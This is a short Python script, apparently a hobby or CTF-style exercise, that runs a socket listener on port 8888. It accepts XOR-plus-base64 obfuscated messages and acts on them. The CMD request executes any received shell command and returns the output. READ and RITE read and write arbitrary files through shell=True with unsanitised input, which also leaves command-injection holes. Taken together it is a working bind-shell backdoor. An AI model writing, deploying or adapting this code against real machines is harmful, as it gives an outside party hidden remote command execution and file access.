# https://www.geeksforgeeks.org/python/socket-programming-python/
import socket             
# import pwn   
import subprocess
import base64

def fixed_xor(arg1: bytes, arg2: bytes) -> bytes:
    assert len(arg1) == len(arg2), "Trying to xor mismatched lengths!"
    return bytes([arg1[i] ^ arg2[i] for i in range(len(arg1))])
  
def xor(message: bytes, key: bytes) -> bytes:
    assert len(message) >= len(key)
    ret = []
    for i in range(len(message)):
        ret.append(message[i] ^ key[i % len(key)])
    return bytes(ret)


s = socket.socket()         
print ("Socket successfully created")

port = 8888
key = b"ED IS COOL"

def enc(plaintext):
  return base64.encodebytes(xor(plaintext, key))

def dec(ciphertext):
  return xor(base64.decodebytes(ciphertext), key)


s.bind(('', port))         
print ("socket binded to %s" %(port)) 

s.listen(5)     
print ("socket is listening")   
c, addr = s.accept()     
print ('Got connection from', addr )

while True:
  s = dec(c.recv(1600)).decode()
  print(s)
  req_type, id, data = s.split('  ')
  print(req_type)
  
  if req_type == 'HELO':
    c.send(enc(f"HI  {id}".encode()))
    
  elif req_type == 'EXIT':
    c.send(enc(f"OK  {id}  ending connection".encode()))
    break
  
  elif req_type == 'READ':
    result = subprocess.run(f"cat {data}", shell=True, capture_output=True, text=True)
    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))
    
  elif req_type == 'RITE':
    print(data)
    content, file = data.split(' to ')
    result = subprocess.run(f"echo {content} > {file}", shell=True, capture_output=True, text=True)
    print(result.stdout, result.stderr)
    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))

  elif req_type == 'CMD':
    result = subprocess.run(f"{data}", shell=True, capture_output=True, text=True)
    print(result.stdout, result.stderr)
    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))

  elif req_type == 'ERR':
    c.send(enc(f"OK  {id}  ending connection".encode()))
    break
  
  # send a thank you message to the client. encoding to send byte type. 
c.send(enc('Thank you for connecting'.encode()))

c.close()
